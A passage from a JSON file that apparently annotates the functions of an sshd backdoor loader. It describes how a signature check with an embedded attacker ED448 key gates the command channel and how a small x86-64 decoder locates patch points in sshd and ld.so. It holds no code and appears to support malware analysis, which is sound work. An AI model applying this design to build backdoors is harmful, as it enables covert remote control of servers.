  "verify_signature": "Computes the host-key hash, loads the attacker\u2019s ED448 public key, and runs EVP_DigestVerify on the supplied signature. This gate keeps the backdoor command channel\u2014only messages signed with the embedded ED448 key reach the executor.",
  "x86_dasm": "Implements a minimal x86-64 decoder that walks a buffer while tracking instruction metadata. Every search helper in the loader uses it to reason about sshd and ld.so machine code without linking a full disassembler, giving the backdoor reliable patch coordinates at runtime."
}
